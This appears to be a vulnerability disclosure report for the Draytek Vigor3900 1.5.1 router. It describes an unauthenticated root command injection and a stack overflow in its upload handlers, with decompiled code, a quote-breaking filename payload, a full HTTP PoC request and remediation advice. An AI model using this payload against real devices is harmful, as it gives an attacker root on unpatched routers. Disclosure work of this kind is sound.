# Draytek Vigor3900 1.5.1 was discovered to contain an unauthenticated command injection vulnerability in apmcfgupload

## Overview

- Vendor: Draytek
- Product: Vigor3900 router
- Version: 1.5.1
- Component: www/cgi-bin/mainfunction.cgi, /apmcfgupload and /cvmcfgupload
- Vulnerability Class: CWE-78 command injection / CWE-306 missing authentication
- CVSS 3.1 (tentative): 9.8 Critical `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`
- Manufacturer: https://www.draytek.com/

## Affected versions

- `Vigor3900_v1.5.1.zip`.
- `www/cgi-bin/mainfunction.cgi`.
- `usr/lib/libcgi.so.1.0.0`.

## Vulnerability details

`main` dispatches the upload paths. For `/apmcfgupload` and
`/cvmcfgupload` it only checks a query-string `session=` value if one is
present:

```c
v21 = getenv("QUERY_STRING");
if ( v21 ) {
    memset(v31, 0, 0x20);
    v23 = time(0);
    v24 = strstr(v21, "session=");
    if ( !v24
      || (snprintf(v31, ..., v24 + 8, 11),
          v25 = strtoul(v31, 0, 10),
          v23 - (v25 ^ (v25 << 16)) <= 0x64) )
    {
        sub_13450(a3, v21, v22 == 0);
    }
}
```

If the attacker sends no `session=` parameter, `!v24` is true and
`sub_13450` is called without the `sub_18C08` auth-level check used by
the other upload paths.

`sub_13450` parses the multipart file, escapes the filename with
`cgiEscape`, and executes:

```c
v8 = (const char *)cgiEscape(*(_DWORD *)(File + 8)); // filename
v9 = strchr(v8, '_');
if (v9) {
    *v9 = 0;
    snprintf(s1, 0x3E8u, "/data/%s/%s/'%s'", v21, "files", v8);
    snprintf(v18, 0x80u, "mkdir -p %s", s1);
    system(v18);
}
```

`cgiEscape` only replaces `<`, `>` and `&` (verified in
`libcgi.so.1`): it leaves single quote, semicolon, backtick and `$`
unchanged. The filename prefix before the first `_` is placed inside
single quotes, so a prefix containing `'` breaks out.

A multipart filename such as:

```text
';id>/tmp/dray_pwn;#'_x
```

produces:

```sh
mkdir -p /data/apm/files/'';id>/tmp/dray_pwn;#''
```

and the second command runs in the `mainfunction.cgi` process context.
The shipped lighttpd configuration has `server.username` commented out
and the web server is started by init as root, so this is root command
execution on the device.

### Stack overflow in the same handler

`sub_13450` also copies the filename prefix into a 64-byte stack buffer
without a length check:

```c
char v20[64];
...
strcpy(v20, v8);   // v8 is the filename prefix before the first '_'
```

A prefix longer than 64 bytes overflows `v20` and adjacent stack
locals; the function has no visible stack-canary check. This is a
pre-auth stack overflow candidate in addition to the command injection
(same request, same unauthenticated path).

## PoC

```http
POST /cgi-bin/mainfunction.cgi/apmcfgupload HTTP/1.1
Host: <router>
Content-Type: multipart/form-data; boundary=BOUND

--BOUND
Content-Disposition: form-data; name="file"; filename="';id>/tmp/dray_pwn;#'_x"
Content-Type: application/octet-stream

AAAA
--BOUND--
```

No cookie or `session=` query parameter is sent. Check the marker:

```sh
cat /tmp/dray_pwn
```

A local `/bin/sh` run of the exact generated `mkdir` command created
the marker with the `id` output. The same code path handles
`/cvmcfgupload` with the `cvm` prefix.

## Verification

The vulnerable handler in the stock `www/cgi-bin/mainfunction.cgi, /apmcfgupload and /cvmcfgupload` was decompiled from the unpacked rootfs; the relevant code and offsets are quoted above. No dynamic run was completed.

## Impact

An unauthenticated attacker on the management interface can execute
arbitrary commands as root by uploading a file whose name contains a
single quote in the prefix before the first `_`. The upload handler
does not require a session when the `session=` query parameter is
omitted.

## Remediation / known-CVE relation

- Require authentication for `/apmcfgupload` and `/cvmcfgupload`
  regardless of the presence of `session=`.
- Do not pass uploaded filenames through a shell. Use `basename`,
  reject characters outside a safe allowlist, and pass the result as a
  separate argv element.
- Replace `cgiEscape` with a shell-safe quoting function or use
  `execve`-style APIs for `mkdir`/`mv`.
- NVD keyword searches on 2026-11-08 for `apmcfgupload`,
  `cvmcfgupload`, `mainfunction.cgi filename command injection` and
  `Draytek Vigor3900 upload` returned zero results. Candidate 0-day;
  no CVE assigned and no vendor contact has been made.

## Additional Information

```markdown
### Vendor
Draytek

### Product
Vigor3900 router

### Version or Commit
1.5.1

### Vulnerability Class
CWE-78 command injection / CWE-306 missing authentication

### Description
The /apmcfgupload and /cvmcfgupload paths reach sub_13450 without a valid session. The uploaded filename is interpolated into mkdir -p .../%s and executed through system(). cgiEscape does not escape single quotes, so an unauthenticated attacker can run commands.

### Affected_component
www/cgi-bin/mainfunction.cgi, /apmcfgupload and /cvmcfgupload

### Attack_vector
Unauthenticated POST to /apmcfgupload with a crafted multipart filename.

### Product_version
Vigor3900 router 1.5.1

### Reference
- https://www.draytek.com/
- https://github.com/vuln-1/vuln/blob/main/Draytek/Vigor3900_V1.5.1/report-1.md
```
